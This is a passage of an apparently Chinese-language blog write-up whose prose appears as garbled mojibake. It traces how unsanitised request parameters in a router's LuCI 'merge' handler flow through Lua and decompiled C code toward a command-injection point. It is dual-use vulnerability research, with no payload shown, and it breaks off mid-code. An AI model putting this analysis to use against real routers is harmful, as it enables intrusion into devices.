class="keyword">if</span> params.async == <span class="literal">true</span> <span class="keyword">or</span> params.async == <span class="string">&quot;true&quot;</span> <span class="keyword">then</span></span><br><span class="line">            back = <span class="number">0</span></span><br><span class="line">            _shell = _shell .. <span class="string">&quot; -b 0 &quot;</span></span><br><span class="line">        <span class="keyword">elseif</span> params.async == <span class="literal">false</span> <span class="keyword">or</span> params.async == <span class="string">&quot;false&quot;</span> <span class="keyword">then</span></span><br><span class="line">            back = <span class="number">1</span></span><br><span class="line">            _shell = _shell .. <span class="string">&quot; -b 1 &quot;</span></span><br><span class="line">        <span class="keyword">end</span></span><br><span class="line">        <span class="keyword">return</span> data, back, ip, password, _shell</span><br><span class="line">    <span class="keyword">end</span></span><br><span class="line"><span class="keyword">end</span></span><br></pre></td></tr></table></figure><p>è€Œè¿™é‡Œä¼šæŠŠ\nå­—ç¬¦ç¼–ç ä¸º\u000aï¼Œå¯¼è‡´æœ€åçš„æ¼æ´ç‚¹è¢«è¡¥ä¸Š</p><p>å› æ­¤çœ‹æœ€åä¸€ä¸ªmergeå‡½æ•°</p><figure class="highlight lua"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">-- ç½‘ç»œåˆå¹¶</span></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">merge</span><span class="params">(params)</span></span></span><br><span class="line">    <span class="keyword">local</span> cmd = <span class="built_in">require</span> <span class="string">&quot;luci.modules.cmd&quot;</span></span><br><span class="line">    <span class="keyword">return</span> cmd.devSta.set(&#123;device = <span class="string">&quot;pc&quot;</span>, <span class="built_in">module</span> = <span class="string">&quot;networkId_merge&quot;</span>, data = params, async = <span class="literal">true</span>&#125;)</span><br><span class="line"><span class="keyword">end</span></span><br></pre></td></tr></table></figure><p>å¯ä»¥çœ‹åˆ°æ²¡æœ‰å¯¹paramsæœ‰ä»»ä½•çš„å¤„ç†ï¼Œè°ƒç”¨äº†setå‡½æ•°</p><figure class="highlight lua"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">devSta[<span class="string">&#x27;set&#x27;</span>] = <span class="function"><span class="keyword">function</span><span class="params">(params)</span></span></span><br><span class="line">    <span class="keyword">local</span> model = <span class="built_in">require</span> <span class="string">&quot;dev_sta&quot;</span></span><br><span class="line">    params.method = <span class="string">&#x27;set&#x27;</span></span><br><span class="line">    params.cfg_cmd = <span class="string">&quot;dev_sta&quot;</span></span><br><span class="line">    <span class="keyword">local</span> data, back, ip, password, shell = doParams(params)</span><br><span class="line">    <span class="keyword">return</span> fetch(model.fetch, shell, params, opt[i], params.<span class="built_in">module</span>, data, back, ip, password)</span><br><span class="line"><span class="keyword">end</span></span><br></pre></td></tr></table></figure><p>dataå­—æ®µä¾¿æ˜¯æˆ‘ä»¬å¯æ§çš„ï¼ˆå³æœ€åˆ<code>POST</code>æŠ¥æ–‡ä¸­<code>params</code>çš„å†…å®¹ï¼‰</p><p>ä¸»fetchå‡½æ•°çš„è°ƒç”¨</p><figure class="highlight lua"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">local</span> <span class="function"><span class="keyword">function</span> <span class="title">fetch</span><span class="params">(fn, shell, params, ...)</span></span></span><br><span class="line">    <span class="built_in">require</span> <span class="string">&quot;luci.json&quot;</span></span><br><span class="line">    <span class="keyword">local</span> tool = <span class="built_in">require</span> <span class="string">&quot;luci.utils.tool&quot;</span></span><br><span class="line">    <span class="keyword">local</span> _start = <span class="built_in">os</span>.<span class="built_in">time</span>()</span><br><span class="line">    <span class="keyword">local</span> _res = fn(...)</span><br><span class="line">    tool.eweblog(shell, params.device, <span class="built_in">os</span>.<span class="built_in">time</span>() - _start)</span><br><span class="line">    <span class="keyword">if</span> params.method ~= <span class="string">&quot;get&quot;</span> <span class="keyword">then</span></span><br><span class="line">        tool.write_log(&#123;action = shell&#125;)</span><br><span class="line">    <span class="keyword">end</span></span><br><span class="line">    <span class="keyword">if</span> _res.code == <span class="number">0</span> <span class="keyword">then</span></span><br><span class="line">        _res = _res.data <span class="keyword">or</span> <span class="string">&quot;&quot;</span></span><br><span class="line">        <span class="keyword">if</span> params.noParse <span class="keyword">then</span></span><br><span class="line">            <span class="keyword">return</span> _res</span><br><span class="line">        <span class="keyword">end</span></span><br><span class="line">        <span class="keyword">return</span> _res <span class="keyword">and</span> luci.json.decode(_res) <span class="keyword">or</span> (_res <span class="keyword">or</span> <span class="string">&quot;&quot;</span>)</span><br><span class="line">    <span class="keyword">end</span></span><br><span class="line">    <span class="keyword">return</span> _res</span><br><span class="line"><span class="keyword">end</span></span><br></pre></td></tr></table></figure><p>å…¶ä¸­çš„fnå‡½æ•°ä¾¿æ˜¯modle.fetch</p><figure class="highlight lua"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">--ä¸»å‡½æ•°</span></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">fetch</span><span class="params">(cmd, module, param, back, ip, password, force, not_change_configId, multi)</span></span></span><br><span class="line">    <span class="keyword">local</span> uf_call = <span class="built_in">require</span> <span class="string">&quot;libuflua&quot;</span></span><br><span class="line">    <span class="keyword">local</span> ctype</span><br><span class="line"></span><br><span class="line">    ctype = get_ctype()</span><br><span class="line">    param = param <span class="keyword">or</span> <span class="string">&quot;&quot;</span></span><br><span class="line">    ip = ip <span class="keyword">or</span> <span class="string">&quot;&quot;</span></span><br><span class="line">    password = password <span class="keyword">or</span> <span class="string">&quot;&quot;</span></span><br><span class="line">    <span class="keyword">if</span> force <span class="keyword">and</span> force == <span class="string">&quot;1&quot;</span> <span class="keyword">then</span></span><br><span class="line">    force = <span class="literal">true</span></span><br><span class="line">    <span class="keyword">else</span></span><br><span class="line">    force = <span class="literal">false</span></span><br><span class="line">    <span class="keyword">end</span></span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> back <span class="keyword">and</span> back == <span class="string">&quot;1&quot;</span> <span class="keyword">then</span></span><br><span class="line">    back = <span class="literal">true</span></span><br><span class="line">    <span class="keyword">else</span></span><br><span class="line">    back = <span class="literal">false</span></span><br><span class="line">    <span class="keyword">end</span>   </span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> not_change_configId <span class="keyword">then</span></span><br><span class="line">    not_change_configId = <span class="literal">true</span></span><br><span class="line">    <span class="keyword">else</span></span><br><span class="line">    not_change_configId = <span class="literal">false</span></span><br><span class="line">    <span class="keyword">end</span></span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> multi <span class="keyword">then</span></span><br><span class="line">    multi = <span class="literal">true</span></span><br><span class="line">    <span class="keyword">else</span></span><br><span class="line">    multi = <span class="literal">false</span></span><br><span class="line">    <span class="keyword">end</span></span><br><span class="line"></span><br><span class="line">    <span class="keyword">local</span> stat = uf_call.client_call(ctype, cmd, <span class="built_in">module</span>, param, back, ip, password, force, not_change_configId, multi)</span><br><span class="line">    <span class="keyword">return</span> stat</span><br><span class="line"><span class="keyword">end</span></span><br></pre></td></tr></table></figure><p>å¯ä»¥çœ‹åˆ°å…¶è°ƒç”¨äº†libufluaçš„client_callå‡½æ•°</p><p>é¦–å…ˆå†libuflua.soä¸­ç›´æ¥çœ‹æ˜¯æ‰¾ä¸åˆ°client_callå‡½æ•°çš„ï¼Œå¯èƒ½æ˜¯å› ä¸ºè¯¥å‡½æ•°åç§°è¢«è¯†åˆ«ä¸ºäº†ä»£ç æ®µï¼Œå› æ­¤æ”¾å…¥010editorä¸­ï¼Œæœç´¢å­—ç¬¦ä¸²client_callï¼Œæ‰¾åˆ°0xFF0ä½ç½®ï¼ŒæŒ‰Aï¼Œ</p><figure class="highlight ini"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">LOAD:00000FF0 63 6C 69 65 6E 74 5F 63 61 6C+aClientCall:.ascii &quot;client_call&quot;&lt;0&gt;      <span class="comment"># DATA XREF: LOAD:off_1101Câ†“o</span></span><br></pre></td></tr></table></figure><p>å¯»æ‰¾äº¤å‰è°ƒç”¨</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">int</span> __fastcall <span class="title function_">luaopen_libuflua</span><span class="params">(<span class="type">int</span> a1)</span></span><br><span class="line">&#123;</span><br><span class="line">  luaL_register(a1, <span class="string">&quot;libuflua&quot;</span>, &amp;off_1101C);</span><br><span class="line">  <span class="keyword">return</span> <span class="number">1</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>è¿™ä¸ªå‡½æ•°ä½¿ç”¨äº†<code>__fastcall</code> è°ƒç”¨çº¦å®šï¼Œåœ¨è¿™ç§çº¦å®šä¸‹ï¼Œå‡½æ•°çš„å‰ä¸¤ä¸ªæ•´æ•°å‚æ•°é€šè¿‡å¯„å­˜å™¨ä¼ é€’ï¼Œå…¶ä¸­luaL_registeræ˜¯ä¸€ä¸ªLua C API å‡½æ•°ï¼Œç”¨äºå°† C å‡½æ•°æ³¨å†Œåˆ° Lua ä¸­ã€‚å®ƒé€šå¸¸ç”¨äºå°†ä¸€ç»„ C å‡½æ•°æ³¨å†Œä¸ºä¸€ä¸ª Lua åº“ã€‚</p><p><code>luaL_register</code> å‡½æ•°å°† <code>off_1101C</code> æŒ‡å‘çš„å‡½æ•°åº“è¡¨æ³¨å†Œåˆ° Lua ä¸­ï¼Œå¹¶å°†å…¶å‘½åä¸º <code>libuflua</code></p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">int</span> __fastcall <span class="title function_">sub_A00</span><span class="params">(<span class="type">int</span> a1)</span></span><br><span class="line">&#123;</span><br><span class="line">  <span class="type">int</span> v2; <span class="comment">// $v0</span></span><br><span class="line">  <span class="type">int</span> v3; <span class="comment">// $s1</span></span><br><span class="line">  <span class="type">int</span> v4; <span class="comment">// $s3</span></span><br><span class="line">  <span class="type">int</span> v5; <span class="comment">// $s2</span></span><br><span class="line">  <span class="type">int</span> v6; <span class="comment">// $v0</span></span><br><span class="line">  <span class="type">int</span> v7; <span class="comment">// $v1</span></span><br><span class="line">  <span class="type">int</span> v8; <span class="comment">// $s3</span></span><br><span class="line">  <span class="type">int</span> v9; <span class="comment">// $a1</span></span><br><span class="line">  <span class="type">int</span> v10; <span class="comment">// $a0</span></span><br><span class="line">  <span class="type">int</span> v11; <span class="comment">// $a1</span></span><br><span class="line">  <span class="type">int</span> v13[<span class="number">3</span>]; <span class="comment">// [sp+18h] [-Ch] BYREF</span></span><br><span class="line"></span><br><span class="line">  v13[<span class="number">0</span>] = <span class="number">0</span>;</span><br><span class="line">  v2 = <span class="built_in">malloc</span>(<span class="number">0x34</span>);</span><br><span class="line">  v3 = v2;</span><br><span class="line">  <span class="keyword">if</span> ( v2 )</span><br><span class="line">  &#123;</span><br><span class="line">    <span class="built_in">memset</span>(v2, <span class="number">0</span>, <span class="number">52</span>);</span><br><span class="line">    v5 = <span class="number">4</span>;</span><br><span class="line">    *(_DWORD *)v3 = luaL_checkinteger(a1, <span class="number">1</span>);</span><br><span class="line">    *(_DWORD *)(v3 + <span class="number">4</span>) = luaL_checklstring(a1, <span class="number">2</span>, <span class="number">0</span>);</span><br><span class="line">    v6 = luaL_checklstring(a1, <span class="number">3</span>, <span class="number">0</span>);</span><br><span class="line">    v7 = *(_DWORD *)v3;</span><br><span class="line">    *(_DWORD *)(v3 + <span class="number">8</span>) = v6;</span><br><span class="line">    <span class="keyword">if</span> ( v7 != <span class="number">3</span> )</span><br><span class="line">    &#123;</span><br><span class="line">      *(_DWORD *)(v3 + <span class="number">12</span>) = lua_tolstring(a1, <span class="number">4</span>, <span class="number">0</span>);</span><br><span class="line">      *(_BYTE *)(v3 + <span class="number">41</span>) = lua_toboolean(a1, <span class="number">5</span>) == <span class="number">1</span>;</span><br><span class="line">      v5 = <span class="number">6</span>;</span><br><span class="line">      *(_BYTE *)(v3 + <span class="number">40</span>) = <span class="number">1</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    *(_DWORD *)(v3 + <span class="number">20</span>) = lua_tolstring(a1, v5, <span class="number">0</span>);</span><br><span class="line">    *(_DWORD *)(v3 + <span class="number">24</span>) = lua_tolstring(a1, v5 + <span class="number">1</span>, <span class="number">0</span>);</span><br><span class="line">    v8 = v5 + <span class="number">2</span>;</span><br><span class="line">    <span class="keyword">if</span> ( *(_DWORD *)v3 )</span><br><span class="line">    &#123;</span><br><span class="line">      <span class="keyword">if</span> ( *(_DWORD *)v3 == <span class="number">2</span> )</span><br><span class="line">      &#123;</span><br><span class="line">        v8 = v5 + <span class="number">3</span>;</span><br><span class="line">        *(_BYTE *)(v3 + <span class="number">43</span>) = lua_toboolean(a1, v5 + <span class="number">2</span>) == <span class="number">1</span>;</span><br><span class="line">      &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">else</span></span><br><span class="line">    &#123;</span><br><span class="line">      *(_BYTE *)(v3 + <span class="number">43</span>) = lua_toboolean(a1, v5 + <span class="number">2</span>) == <span class="number">1</span>;</span><br><span class="line">      v8 = v5 + <span class="number">4</span>;</span><br><span class="line">      *(_BYTE *)(v3 + <span class="number">44</span>) = lua_toboolean(a1, v5 + <span class="number">3</span>) == <span class="number">1</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    *(_BYTE *)(v3 + <span class="number">48</span>) = lua_toboolean(a1, v8) == <span class="number">1</span>;</span><br><span class="line">    v4 = uf_client_call(v3, v13, <span class="number">0</span>);</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">else</span></span><br><span class="line">  &#123;</span><br><span class="line">    v13[<span class="number">0</span>] = strdup(<span class="string">&quot;memory full!&quot;</span>);</span><br><span class="line">    v4 = <span class="number">-1</span>;</span><br><span class="line">  &#125;</span><br><span class="line">  lua_createtable(a1, <span class="number">0</span>, <span class="number">0</span>);</span><br><span class="line">  lua_pushstring(a1, <span class="string">&quot;code&quot;</span>);</span><br><span class="line">  <span class="keyword">if</span> ( v4 )</span><br><span class="line">  &#123;</span><br><span class="line">    lua_pushnumber(a1, v9, loc_1000, loc_1004);</span><br><span class="line">    lua_rawset(a1, <span class="number">-3</span>);</span><br><span class="line">    lua_pushstring(a1, <span class="string">&quot;err&quot;</span>);</span><br><span class="line">    lua_pushstring(a1, v13[<span class="number">0</span>]);</span><br><span class="line">    lua_rawset(a1, <span class="number">-3</span>);</span><br><span class="line">    lua_pushstring(a1, <span class="string">&quot;data&quot;</span>);</span><br><span class="line">    v10 = a1;</span><br><span class="line">    v11 = <span class="number">0</span>;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">else</span></span><br><span class="line">  &#123;</span><br><span class="line">    lua_pushnumber(a1, v9, <span class="number">0</span>, <span class="number">0</span>);</span><br><span class="line">    lua_rawset(a1, <span class="number">-3</span>);</span><br><span class="line">    lua_pushstring(a1, <span class="string">&quot;err&quot;</span>);</span><br><span class="line">    lua_pushstring(a1, <span class="number">0</span>);</span><br><span class="line">    lua_rawset(a1, <span class="number">-3</span>);</span><br><span class="line">    lua_pushstring(a1, <span class="string">&quot;data&quot;</span>);</span><br><span class="line">    v11 = v13[<span class="number">0</span>];</span><br><span class="line">    v10 = a1;</span><br><span class="line">  &#125;</span><br><span class="line">  lua_pushstring(v10, v11);</span><br><span class="line">  lua_rawset(a1, <span class="number">-3</span>);</span><br><span class="line">  <span class="keyword">if</span> ( v13[<span class="number">0</span>] )</span><br><span class="line">    <span class="built_in">free</span>();</span><br><span class="line">  <span class="keyword">return</span> <span class="number">1</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>ä¸ºäº†èƒ½é¡ºåˆ©åˆ†æè¿™ä¸ªCå‡½æ•°ï¼Œæˆ‘ä»¬è¦å…ˆäº†è§£Luaæ ˆæ˜¯ä»€ä¹ˆ</p><blockquote><p>Lua æ ˆæ˜¯ Lua è™šæ‹Ÿæœºç”¨æ¥ç®¡ç†å‡½æ•°è°ƒç”¨å’Œæ•°æ®ä¼ é€’çš„ä¸€ä¸ªé‡è¦ç»“æ„ã€‚å®ƒæ˜¯ä¸€ä¸ªåè¿›å…ˆå‡ºï¼ˆLIFOï¼‰çš„æ•°æ®ç»“æ„ï¼Œä¸“é—¨ç”¨äºåœ¨ C å’Œ Lua ä¹‹é—´ä¼ é€’æ•°æ®ã€‚æ¯ä¸ª Lua çŠ¶æ€æœºï¼ˆ<code>lua_State</code>ï¼‰éƒ½æœ‰è‡ªå·±çš„æ ˆï¼Œç”¨äºå­˜å‚¨å‡½æ•°å‚æ•°ã€è¿”å›å€¼å’Œä¸´æ—¶å˜é‡ã€‚</p><ol><li><strong>å‹æ ˆæ“ä½œ</strong>:<ul><li><code>lua_pushnumber(lua_State* L, lua_Number n)</code>: å°†ä¸€ä¸ªæ•°å­—å‹å…¥æ ˆä¸­ã€‚</li><li><code>lua_pushstring(lua_State* L, const char* s)</code>: å°†ä¸€ä¸ªå­—ç¬¦ä¸²å‹å…¥æ ˆä¸­ã€‚</li><li><code>lua_pushboolean(lua_State* L, int b)</code>: å°†ä¸€ä¸ªå¸ƒå°”å€¼å‹å…¥æ ˆä¸­ã€‚</li><li><code>lua_pushnil(lua_State* L)</code>: å°†ä¸€ä¸ª nil å‹å…¥æ ˆä¸­ã€‚</li></ul></li><li><strong>å¼¹æ ˆæ“ä½œ</strong>:<ul><li><code>lua_tonumber(lua_State* L, int index)</code>: å°†æ ˆä¸ŠæŒ‡å®šç´¢å¼•å¤„çš„å€¼è½¬æ¢ä¸ºæ•°å­—ã€‚</li><li><code>lua_tostring(lua_State* L, int index)</code>: å°†æ ˆä¸ŠæŒ‡å®šç´¢å¼•å¤„çš„å€¼è½¬æ¢ä¸ºå­—ç¬¦ä¸²ã€‚</li><li><code>lua_toboolean(lua_State* L, int index)</code>: å°†æ ˆä¸ŠæŒ‡å®šç´¢å¼•å¤„çš„å€¼è½¬æ¢ä¸ºå¸ƒå°”å€¼ã€‚</li></ul></li><li><strong>æ ˆæ“ä½œ</strong>:<ul><li><code>lua_settop(lua_State* L, int index)</code>: è®¾ç½®æ ˆé¡¶ç´¢å¼•ã€‚</li><li><code>lua_gettop(lua_State* L)</code>: è·å–æ ˆé¡¶ç´¢å¼•ã€‚</li><li><code>lua_remove(lua_State* L, int index)</code>: ç§»é™¤æ ˆä¸ŠæŒ‡å®šç´¢å¼•å¤„çš„å€¼ã€‚</li></ul></li><li><strong>è¡¨æ“ä½œ</strong>:<ul><li><code>lua_createtable(lua_State* L, int narr, int nrec)</code>: åˆ›å»ºä¸€ä¸ªæ–°çš„è¡¨å¹¶å‹å…¥æ ˆä¸­ã€‚</li><li><code>lua_settable(lua_State* L, int index)</code>: å°†æ ˆé¡¶çš„å€¼å¼¹å‡ºå¹¶å­˜å‚¨åœ¨è¡¨ä¸­ã€‚</li><li><code>lua_gettable(lua_State* L, int index)</code>: è·å–è¡¨ä¸­çš„å€¼å¹¶å‹å…¥æ ˆä¸­ã€‚</li></ul></li></ol></blockquote><p>ä½†æ˜¯å¯ä»¥ç›´æ¥ç†è§£ä¸ºè°ƒç”¨äº†<code>v4 = uf_client_call(v3, v13, 0);</code>uf_client_callå‡½æ•°ï¼Œå› ä¸ºæœ¬å‡½æ•°æ˜æ˜¾æ²¡æœ‰æ˜¾ç¤ºçš„æ¼æ´ç‚¹ï¼Œå› æ­¤å°±å…ˆè·Ÿè¿›ç„¶åå†è¿”å›æ¥æ‰¾</p><p><img src="https://cdn.jsdelivr.net/gh/s1nec-1o/photo@main/img/202405300037160.png" alt="image-20240527003055624"></p><p>ä»è¿™é‡Œè·Ÿå¹³æ—¶çš„Cåº“æ˜¯ä¸€æ ·çš„ï¼Œè¯´æ˜è¿™ä¸ªå‡½æ•°æ˜¯ä¸€ä¸ªå¤–éƒ¨åº“å®šä¹‰çš„å‡½æ•°</p><p><img src="https://cdn.jsdelivr.net/gh/s1nec-1o/photo@main/img/202405300037161.png" alt="image-20240527003258125"></p><p>æœç´¢åˆ°æ˜¾ç„¶æ˜¯libunifyframe.soåº“</p><h2 id="äºŒè¿›åˆ¶æ–‡ä»¶åˆ†æ"><a href="#äºŒè¿›åˆ¶æ–‡ä»¶åˆ†æ" class="headerlink" title="äºŒè¿›åˆ¶æ–‡ä»¶åˆ†æ"></a>äºŒè¿›åˆ¶æ–‡ä»¶åˆ†æ</h2><p>åœ¨åˆ†æä¹‹å‰é™„ä¸Šzikh26å¸ˆå‚…ç”»çš„è°ƒç”¨æ ˆ</p><p><img src="https://cdn.jsdelivr.net/gh/s1nec-1o/photo@main/img/202405300037162.png" alt="image-20240529225726519"></p><h3 id="uf-client-call"><a href="#uf-client-call" class="headerlink" title="uf_client_call"></a>uf_client_call</h3><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br><span class="line">155</span><br><span class="line">156</span><br><span class="line">157</span><br><span class="line">158</span><br><span class="line">159</span><br><span class="line">160</span><br><span class="line">161</span><br><span class="line">162</span><br><span class="line">163</span><br><span class="line">164</span><br><span class="line">165</span><br><span class="line">166</span><br><span class="line">167</span><br><span class="line">168</span><br><span class="line">169</span><br><span class="line">170</span><br><span class="line">171</span><br><span class="line">172</span><br><span class="line">173</span><br><span class="line">174</span><br><span class="line">175</span><br><span class="line">176</span><br><span class="line">177</span><br><span class="line">178</span><br><span class="line">179</span><br><span class="line">180</span><br><span class="line">181</span><br><span class="line">182</span><br><span class="line">183</span><br><span class="line">184</span><br><span class="line">185</span><br><span class="line">186</span><br><span class="line">187</span><br><span class="line">188</span><br><span class="line">189</span><br><span class="line">190</span><br><span class="line">191</span><br><span class="line">192</span><br><span class="line">193</span><br><span class="line">194</span><br><span class="line">195</span><br><span class="line">196</span><br><span class="line">197</span><br><span class="line">198</span><br><span class="line">199</span><br><span class="line">200</span><br><span class="line">201</span><br><span class="line">202</span><br><span class="line">203</span><br><span class="line">204</span><br><span class="line">205</span><br><span class="line">206</span><br><span class="line">207</span><br><span class="line">208</span><br><span class="line">209</span><br><span class="line">210</span><br><span class="line">211</span><br><span class="line">212</span><br><span class="line">213</span><br><span class="line">214</span><br><span class="line">215</span><br><span class="line">216</span><br><span class="line">217</span><br><span class="line">218</span><br><span class="line">219</span><br><span class="line">220</span><br><span class="line">221</span><br><span class="line">222</span><br><span class="line">223</span><br><span class="line">224</span><br><span class="line">225</span><br><span class="line">226</span><br><span class="line">227</span><br><span class="line">228</span><br><span class="line">229</span><br><span class="line">230</span><br><span class="line">231</span><br><span class="line">232</span><br><span class="line">233</span><br><span class="line">234</span><br><span class="line">235</span><br><span class="line">236</span><br><span class="line">237</span><br><span class="line">238</span><br><span class="line">239</span><br><span class="line">240</span><br><span class="line">241</span><br><span class="line">242</span><br><span class="line">243</span><br><span class="line">244</span><br><span class="line">245</span><br><span class="line">246</span><br><span class="line">247</span><br><span class="line">248</span><br><span class="line">249</span><br><span class="line">250</span><br><span class="line">251</span><br><span class="line">252</span><br><span 